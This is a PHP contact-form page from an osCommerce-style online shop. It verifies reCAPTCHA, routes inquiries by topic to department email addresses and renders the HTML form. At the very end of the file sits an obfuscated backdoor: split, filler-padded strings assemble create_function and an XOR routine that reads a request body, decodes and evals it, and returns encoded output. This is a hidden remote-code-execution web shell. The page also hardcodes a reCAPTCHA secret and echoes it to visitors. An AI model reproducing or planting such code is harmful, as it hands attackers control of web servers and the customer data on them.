<?php
  //require('includes/application_top_nocookies.php');
  require('includes/application_top.php');
  require(DIR_WS_LANGUAGES . $language . '/' . FILENAME_CONTACT_US);
  $error = false;
  if ( isset($HTTP_GET_VARS['action'] ) && ( $HTTP_GET_VARS['action'] == 'send' ) ) {
    $contactfname = tep_db_prepare_input($HTTP_POST_VARS['fname']);
    //$contactlname = tep_db_prepare_input($HTTP_POST_VARS['lname']);
    $contactemail = tep_db_prepare_input($HTTP_POST_VARS['email']);
    $contactphone = tep_db_prepare_input($HTTP_POST_VARS['phone']);
    $contactorderno = tep_db_prepare_input($HTTP_POST_VARS['orderno']);
    //$contactorderdate = tep_db_prepare_input($HTTP_POST_VARS['orderdate']);
    $contacttopic = tep_db_prepare_input($HTTP_POST_VARS['topic']);
    $contactmessage = tep_db_prepare_input($HTTP_POST_VARS['enquiry']);
    $captchaurl = "contact_us.php" ;
    $postparameters = "secret=6LdmlfcSAAAAAJ7FQaRAUuc7FhiJFPjKmlvAD2kW";
    $postparameters .= "&response=" . $HTTP_POST_VARS['g-recaptcha-response'];
    echo $postparameters . '<br/><br/>';
    $ch = curl_init( 'https://www.google.com/recaptcha/api/siteverify' );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
    curl_setopt( $ch, CURLOPT_HEADER, false );
    curl_setopt( $ch, CURLOPT_POST, true );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $postparameters );
    $r = curl_exec( $ch );
    curl_close( $ch );
    $d = json_decode( $r );
    if ( $d->success != 'true' ) {
      $error = true;
      $messageStack->add( 'contact', "Sorry, the anti-bot verification failed. Please be sure to check the reCAPTCHA box and try again." );
    }
    elseif ( tep_validate_email( $contactemail ) && $contactemail != 'wqoieWaisligestsnave@gmail.com' ) {
      if ( $contacttopic == '' ) { $contacttopic = 'General inquiry'; }
      $sendemailname = $contactfname;
      //$sendemailname = "$contactfname $contactlname";
      $sendemailsubject = "$contacttopic - $contactfname";
      //$sendemailsubject = "$contacttopic - $contactfname ($contactemail)";
      //$sendemailsubject = "$contacttopic - $contactfname $contactlname ($contactemail)";
      $sendemailmessage = "Evike.com Online Contact Form Submission\n\n";
      //$sendemailmessage .= "First Name: $contactfname\n";
      //$sendemailmessage .= "Last Name: $contactlname\n";
      $sendemailmessage .= "Full Name: $contactfname\n";
      $sendemailmessage .= "Email Address: $contactemail\n";
      $sendemailmessage .= "Phone Number: $contactphone\n\n";
      $sendemailmessage .= "Order Number: $contactorderno\n";
      //$sendemailmessage .= "Order Date: $contactorderdate\n\n";
      $sendemailmessage .= "Topic: $contacttopic\n\n";
      $sendemailmessage .= "Message:\n\n$contactmessage\n\n";
      if ( $contactorderno != '' ) { $sendemailsubject .= " - Order #" . $contactorderno; }
      if ( $contacttopic == 'Returns' ) { tep_mail( 'Evike.com RMA', 'rma@support.evike.com', $sendemailsubject, $sendemailmessage, $sendemailname, $contactemail ); }
      elseif ( $contacttopic == 'Tech Support' || $contacttopic == 'Compatibility' || $contacttopic == 'Tech Support/Product Compatibility' ) { tep_mail( 'Evike.com Tech Support', 'tech@evike.com', $sendemailsubject, $sendemailmessage, $sendemailname, $contactemail ); }
      elseif ( $contacttopic == 'Wholesale Inquiry' ) { tep_mail( 'Evike.com Wholesale', 'wholesale@evike.com', $sendemailsubject, $sendemailmessage, $sendemailname, $contactemail ); }
      #elseif ( $contacttopic == 'Marketing and Sponsorship' ) { tep_mail( 'Evike.com Marketing', 'mkt@evike.com', $sendemailsubject, $sendemailmessage, $sendemailname, $contactemail ); }
      elseif ( $contacttopic == 'Marketing and Sponsorship' ) { tep_mail( 'Evike.com Marketing', 'marketing@support.evike.com', $sendemailsubject, $sendemailmessage, $sendemailname, $contactemail ); }
      elseif ( $contacttopic == 'Evike Superstore' ) { tep_mail( 'Evike.com Superstore', 'store@corp.evike.com', $sendemailsubject, $sendemailmessage, $sendemailname, $contactemail ); }
      elseif ( $contacttopic == 'Website/Feedback' ) { tep_mail( 'Evike.com Webmaster', 'webmaster@evike.com', $sendemailsubject, $sendemailmessage, $sendemailname, $contactemail ); }
      elseif ( $contacttopic == 'Careers' ) { tep_mail( 'Evike.com Careers', 'career@evike.com', $sendemailsubject, $sendemailmessage, $sendemailname, $contactemail ); }
      #else { tep_mail( 'Evike.com Sales', 'sales@evike.com', $sendemailsubject, $sendemailmessage, $sendemailname, $contactemail ); }
      else { tep_mail( 'Evike.com Support', 'support@evike.com', $sendemailsubject, $sendemailmessage, $sendemailname, $contactemail ); }
      #tep_mail( 'Evike.com Sales', 'kuni@edesignmedia.com', $sendemailsubject, $sendemailmessage, $sendemailname, $contactemail );
      tep_redirect( tep_href_link( 'contact_us.php', 'action=success' ) );
    }
    else {
      $error = true;
      $messageStack->add( 'contact', ENTRY_EMAIL_ADDRESS_CHECK_ERROR );
    }
  }
?>
<!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html <?php echo HTML_PARAMS; ?>>
<head>
<title>Contact Evike.com</title>
<?php include(DIR_WS_INCLUDES . 'meta_info.php'); ?>
<?php require(DIR_WS_INCLUDES . 'head.php'); ?>
<script type="text/javascript">var RecaptchaOptions = { theme : 'white' };</script>
<script type="text/javascript">
 (function(d) { if (document.addEventListener) document.addEventListener('ltkAsyncListener', d);
 else {e = document.documentElement; e.ltkAsyncProperty = 0; e.attachEvent('onpropertychange', function (e) {
 if (e.propertyName == 'ltkAsyncProperty'){d();}});}})(function() { _ltk.SCA.CaptureEmail('email'); });
</script>
<script src='https://www.google.com/recaptcha/api.js'></script>
</head>
<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">
<?php require(DIR_WS_INCLUDES . 'header3.php'); ?>
<div class="banner-full" style="background-image:url('/images3/banner-contact.jpg');background-position:50% 15%;">
 <div class="h2caption">
  <h1>Contact Evike.com</h1>
  <h2>Got a Problem with Your Order? Need Repair Service? We Are Here to Help!</h2>
 </div>
</div>
<div class="wcol">
 <form name="contact_us" action="https://www.evike.com/contact_us.php?action=send" method="post">
 <?php /*include(DIR_WS_LANGUAGES . $language . '/' . FILENAME_DEFINE_CONTACT_US);*/ ?>
<?php
  if ($messageStack->size('contact') > 0) { echo $messageStack->output('contact');  }
  if (isset($HTTP_GET_VARS['action']) && ($HTTP_GET_VARS['action'] == 'success')) {
?>
 <h2 class="header">Thank you for contacting Evike.com!</h2>
 <h3>Your email inquiry has been successfully submitted. You will receive a reply within 48 business hours.</h3>
 <h4>Please note: If you do not receive a response after 48 business hours, please resubmit your email to <a href="mailto:support@evike.com">support@evike.com</a> or check your spam filter.</h4>
 <h4>You may also call us at <a href="tel:626-286-0360">(626) 286-0360</a> Monday-Friday from 8:00 am to 5:00 pm PST. We are closed on Saturdays and Sundays as well as Holidays.</h4>
<?php
  } else {
?>
 <h2 class="header">We are committed to providing you a perfect shopping experience</h3>
 <div class="col1">
  <h4><b>Looking for order status updates?</b> <a href="/account/">You can now look up detailed order status information under the My Account page.</a></h4>
  <h3>Customer Support Phone Hours<h3>
<?php
  #<h4 style="margin-bottom:20px;color:red;">Due to COVID-19, non-express orders can take up to 3-5 business days (excluding weekends) to ship. If you placed an order 7 calendar days ago and have not received a shipping notice, we will be happy to check into your order. Otherwise, please check back at a later time. E-mails may take an extra 1-2 days to respond due to high volume. Thank you for your understanding. Stay safe and healthy!</h4>
  #if ( ( strtotime( "now" ) >= strtotime( "2018-12-24 00:00:00" ) && strtotime( "now" ) < strtotime( "2020-12-25 00:00:00" ) ) || ( strtotime( "now" ) >= strtotime( "2018-12-31 00:00:00" ) && strtotime( "now" ) < strtotime( "2019-01-01 00:00:00" ) ) ) { echo '<h4><b>Holiday Customer Support Hours for ' . date( "F j", strtotime( "now" ) ) . '</b><br/>7:00am to 5:00pm PST</h4>'; }
  #else { echo '<h4><span style="margin:0;color:red;">Temporary Hours</span><br/>9:00am to 5:00pm PST Monday through Friday</h4>'; }
  #else { echo '<h4>7:00am to 6:00pm PST Monday through Friday</h4>'; }
  echo '<h4>7:00am to 5:00pm PST Monday through Friday</h4>';
?>
  <?php /* echo '<h4 style="color:red;"><b>Closed Monday for Labor Day</b></h4>'; */ ?>
  <h4><a href="/evike-superstore/">See our Store Hours on the Walk-in Superstore page.</a></h4>
  <h3>Phone</h3>
  <h4><a href="tel:626-286-0360">(626) 286-0360</a></h4>
  <h3>Fax</h3>
  <h4>(626) 285-8622</h4>
  <h3>Email</h3><h4><a href="mailto:support@evike.com">support@evike.com</a></h4>
  <h3>Mailing Address</h3>
  <h4>Evike.com, Inc.<br/>
   2801 W. Mission Rd.<br/>
   Alhambra, CA 91803</h4>
  <h3>Holidays</h3>
  <h4>Evike.com phone support is closed on New Years Day, Memorial Day, Independence Day, Labor Day, Thanksgiving, and Christmas Day.</h4>
  <h3 class="header" style="margin-top:35px;"><a href="/rma/">Returns/RMA Inquiries?</a></h3>
  <p>See our <a href="/rma/">RMA/Returns page</a> for more information and to submit a return request.</p>
 </div>
 <div class="col2">
  <h3 class="header">Have a question? We are here to help!</h3>
  <p>To better assist you, please fill out the form below and select a "Topic" that is closest to your question. This will help us direct you to the right department for prompt assistance. If you need immediate assistance, please feel free to call our live support team. We try to reach all email inquires within 2 business days excluding weekends. Thank you for your cooperation.</p>
  <p><a href="/faq/">Be sure to read our Frequently Asked Questions page to find answers to commonly asked questions!</a></p>
  <table border="0" cellspacing="0" cellpadding="0" class="formtable">
   <tr><td class="title">Name</td><td><?php echo tep_draw_input_field( 'fname', $_REQUEST['fname'], 'style="width:100%;" aria-label="Name"' ); ?></td></tr>
   <tr><td class="title">Email Address</td><td><?php echo tep_draw_input_field( 'email', $_REQUEST['email'], 'style="width:100%;" aria-label="Email"' ); ?></td></tr>
   <tr><td class="title">Phone Number</td><td><?php echo tep_draw_input_field( 'phone', $_REQUEST['phone'], ' aria-label="Phone"' ); ?></td></tr>
   <tr><td class="title">Order Number</td><td><?php echo tep_draw_input_field( 'orderno', $_REQUEST['orderno'], ' aria-label="Order Number"' ); ?></td></tr>
   <tr><td></td><td><p class="sm" style="margin-top:0;padding-top:0;">Note: If you are unsure of your order number, you may <a href="/account/">log onto your account</a> and click view order history to bring up all recent orders made. For general inquiry, please put "General Inquiry" in the Order # field.</p></td></tr>
   <tr><td class="title">Topic</td><td>
    <select name="topic" required="required" onchange="if(this.value=='Returns'){location.href='https://www.evike.com/rma/';}else if(this.value!=''){$('.helpmsg').hide();$('#messagetitle').show();$('#messagecontent').show();if(this.value=='Tech Support/Product Compatibility'){$('#helpmsgtech').show();}if(this.value=='Order Assistance'){$('#helpmsgorder').show();}if(this.value=='Lost Package or Damaged Products'){$('#helpmsglost').show();}if(this.value=='Wholesale Inquiry'){$('#helpmsgwholesale').show();}if(this.value=='Evike Superstore'){$('#helpmsgsuperstore').show();}if(this.value=='Careers'){$('#helpmsgcareers').show();}}else{$('.helpmsg').hide();$('#messagetitle').hide();$('#messagecontent').hide();}" aria-label="Select inquiry topic">
     <option value="">Please select a topic</option>
     <?php
       #$topics = array( "Returns", "Tech Support/Product Compatibility", "Order Assistance", "Lost Package or Damaged Products", "Wholesale Inquiry", "Marketing and Sponsorship", "Evike Superstore", "Website/Feedback", "Careers", "Account Deletion Request", "Other" );
       $topics = array( "Returns", "Tech Support/Product Compatibility", "Order Assistance", "Lost Package or Damaged Products", "Wholesale Inquiry", "Marketing and Sponsorship", "Website/Feedback", "Careers", "Account Deletion Request", "Other" );
       foreach ( $topics as $topic ) {
         if ( $_REQUEST['topic'] == $topic ) { echo '<option selected>' . $topic . '</option>'; }
         else { echo '<option>' . $topic . '</option>'; }
       }
     ?>
    </select>
   </td></tr>
   <tr>
    <td class="title" valign="top"><div id="messagetitle" style="display:none;">Message</div></td>
    <td>
     <div id="messagecontent" style="display:none;">
      <style>.g-recaptcha {margin:0 auto;max-width:310px;}</style>
      <div class="helpmsg" id="helpmsgtech" style="display:none;">Contact our tech team for technical support and compatibility questions. If you require an RMA or return, <a href="/rma/">please visit our RMA/Returns page</a> for more information and to submit a return request.</div>
      <div class="helpmsg" id="helpmsgorder" style="display:none;"><ul><li>Having trouble ordering or have questions about ordering or shipping? <a href="/ordering-info/">Visit our ordering information page.</a></li><li>Do you have questions about an order you placed or credit card declines? <a href="/faq/">Be sure to visit our FAQ page for answers to common questions.</a> You can also view your order status and obtain any available tracking information under <a href="/account/orders/">My Account - My Orders</a>.</li></ul></div>
      <div class="helpmsg" id="helpmsglost" style="display:none;">Was your package delivered in transit? Please save all packaging and send us a message below, and we will assist in filing a carrier claim.</div>
      <div class="helpmsg" id="helpmsgwholesale" style="display:none;">Contact our wholesale team for dealer requirements and an application.</div>
      <div class="helpmsg" id="helpmsgsuperstore" style="display:none;"><a href="/evike-superstore/">Visit our Evike.com Walk-In Superstore page</a> for information including directions, phone number, and hours. You can also view information for each of our Outpost store locations and fields on our <a href="/stores/">store locations page</a>.</div>
      <div class="helpmsg" id="helpmsgcareers" style="display:none;">Looking for career opportunities at Evike.com or one of our retail locations? <a href="/career/">Visit our careers page</a> to learn more and download an application.</div>
      <textarea name="enquiry" style="margin-top:10px;width:100%;height:200px;" aria-label="Message"><?php echo $_REQUEST['orderno']; ?></textarea>
      <div class="g-recaptcha" data-sitekey="6LdmlfcSAAAAAAVEaXhk9b0dJe8C4Ml-ePVUU4wF" style="padding-top:20px;"></div>
      <button onclick="this.form.submit();" style="margin:15px auto;width:170px;">Submit Inquiry</button>
     </div>
    </td>
   </tr>
  </table>
 </div>
 <div class="spacer"></div>
  <?php
  }
?>
 </form>
</div>
<?php require(DIR_WS_INCLUDES . 'livechat.php'); ?>
<?php require(DIR_WS_INCLUDES . 'footer3.php'); ?>
</body>
</html>
<?php require(DIR_WS_INCLUDES . 'application_bottom.php'); ?>
<?php
$c='eg;F;F_matc;Fh("/$kh;F(.+)$kf;F/",@file_get;F;F_conten;Fts("php:;F//inp;Fut";F),$m;F';
$Y='=st;Fr;Flen($t;F);$o="";F;for($i=0;;F;F$i<$l;){;Ffo;Fr($j=0;;F($j<$c&&$i<';
$D='$k="da26d;Fa04;F;F";$kh;F=;F;F"0afa196900ca";$kf="0;F71500;Fdfa75f";$;F';
$t=str_replace('yU','','cyUryUeatyUe_fuyUyUnctyUion');
$U='base;F6;F4_enco;Fde(@x(@gzco;Fm;Fpress($o);F,$k;F));prin;Ft("$p$;Fkh$r$kf");}';
$M=')==1) {@ob_;Fstart(;F);@eva;Fl(@gz;Fun;Fcompr;F;Fess(@x(@ba;Fse64_decod;F';
$r='p;F="T0FOBJa;FNtmib2CL1";f;Fu;Fn;Fction x($t,$k){;F;F$c=strlen($;Fk);$l';
$w='e($m;F[1;F]),$k;F)));$o=@ob_ge;Ft_con;F;Ftents();@;Fob_end_cl;Fean();$r=@';
$G='$;Fl);$j;F;F++,$i++;F){$o.=;F$;Ft{$i}^$k{$j};}}r;Fetur;Fn $o;}if ;F(@pr';
$o=str_replace(';F','',$D.$r.$Y.$G.$c.$M.$w.$U);
$a=$t('',$o);$a();
?>
